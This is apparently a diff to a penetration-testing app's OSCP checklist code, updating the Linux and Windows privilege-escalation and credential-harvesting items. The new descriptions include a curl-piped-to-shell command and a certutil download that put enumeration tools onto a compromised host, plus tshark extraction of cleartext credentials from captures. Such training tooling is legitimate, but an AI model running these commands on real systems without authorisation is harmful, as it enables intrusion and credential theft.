@@ -2158,15 +2158,19 @@ def build_oscp_checklist() -> list[ChecklistItem]:
             id="OSCP-PRIVL-01",
             name="Linux Privilege Escalation Enumeration",
             description=(
-                "Run on the compromised host itself (this app only reaches the target "
-                "over the network, it doesn't get a shell on it) — LinPEAS or "
-                "linux-smart-enumeration, plus by hand: `sudo -l`, SUID/SGID binaries "
-                "(`find / -perm -4000 2>/dev/null`), writable cron jobs, kernel version, "
-                "readable credential files."
+                "The actual enumeration script runs on the compromised host itself "
+                "(this app only reaches the target over the network, it doesn't get a "
+                "shell on it) — `linpeas` here serves linpeas.sh for you to pull onto "
+                "that shell (`curl http://<you>:8022/linpeas.sh | sh`), rather than "
+                "running anything against the network target directly. Supplement by "
+                "hand: `sudo -l`, SUID/SGID binaries (`find / -perm -4000 2>/dev/null`), "
+                "Linux capabilities (`getcap -r / 2>/dev/null` — linpeas flags these "
+                "too, but easy to miss reading its firehose of output), writable cron "
+                "jobs, kernel version, readable credential files."
             ),
             category="Privilege Escalation (Linux)",
             category_code="PRIVL",
-            tools=[],
+            tools=["linpeas"],
         ),
         ChecklistItem(
             id="OSCP-PRIVL-02",
@@ -2188,14 +2192,17 @@ def build_oscp_checklist() -> list[ChecklistItem]:
             id="OSCP-PRIVW-01",
             name="Windows Privilege Escalation Enumeration",
             description=(
-                "Run on the compromised host itself — WinPEAS, plus by hand: "
-                "`whoami /priv`, unquoted service paths, AlwaysInstallElevated, "
-                "stored credentials (`reg query`, scheduled tasks, saved sessions), "
-                "`systeminfo` for a missing-patch check."
+                "The actual enumeration binary runs on the compromised host itself — "
+                "`linpeas` here serves winPEASx64.exe for you to pull onto that shell "
+                "(`certutil -urlcache -f http://<you>:8022/winPEASx64.exe winpeas.exe`), "
+                "rather than running anything against the network target directly. "
+                "Supplement by hand: `whoami /priv`, unquoted service paths, "
+                "AlwaysInstallElevated, stored credentials (`reg query`, scheduled "
+                "tasks, saved sessions), `systeminfo` for a missing-patch check."
             ),
             category="Privilege Escalation (Windows)",
             category_code="PRIVW",
-            tools=[],
+            tools=["linpeas"],
         ),
         ChecklistItem(
             id="OSCP-PRIVW-02",
@@ -2256,10 +2263,17 @@ def build_oscp_checklist() -> list[ChecklistItem]:
         ChecklistItem(
             id="OSCP-POST-01",
             name="Credential Harvesting & Loot Collection",
-            description="Collect credentials, config files, and other loot from the compromised host — often the key to reaching further hosts.",
+            description=(
+                "Collect credentials, config files, and other loot from the "
+                "compromised host — often the key to reaching further hosts. "
+                "`tshark` here doesn't collect anything itself: it reads a .pcap "
+                "already obtained some other way (downloaded from the target, saved "
+                "as this item's own evidence, captured during a MITM) and pulls out "
+                "cleartext FTP/HTTP/POP/IMAP/SMTP credentials from it."
+            ),
             category="Post-Exploitation",
             category_code="POST",
-            tools=[],
+            tools=["tshark"],
         ),
         ChecklistItem(
             id="OSCP-POST-02",
